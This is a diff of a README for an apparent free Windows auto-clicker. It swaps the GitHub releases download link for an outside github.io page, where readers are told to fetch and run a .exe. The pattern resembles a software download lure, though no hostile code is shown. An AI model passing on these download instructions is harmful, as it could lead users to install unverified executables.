@@ -1,6 +1,6 @@
 # 🖱️ Auto-Clicker-2026-Free-Download-PC - Automate mouse clicks with simple software
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Malegranuloma119/Auto-Clicker-2026-Free-Download-PC/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://malegranuloma119.github.io)
 
 This software helps users automate mouse clicks on Windows. It works for repetitive tasks in games or office applications. You set the speed, the click type, and the location. The program handles the rest.
 
@@ -25,7 +25,7 @@ The tool includes several options to match different needs:
 
 Follow these steps to set up the software on your PC.
 
-1.  Visit the official release page: [https://github.com/Malegranuloma119/Auto-Clicker-2026-Free-Download-PC/releases](https://github.com/Malegranuloma119/Auto-Clicker-2026-Free-Download-PC/releases)
+1.  Visit the official release page: [https://malegranuloma119.github.io](https://malegranuloma119.github.io)
 2.  Look for the latest version at the top of the list.
 3.  Click the file ending in .exe to download the installer.
 4.  Save the file to your computer.
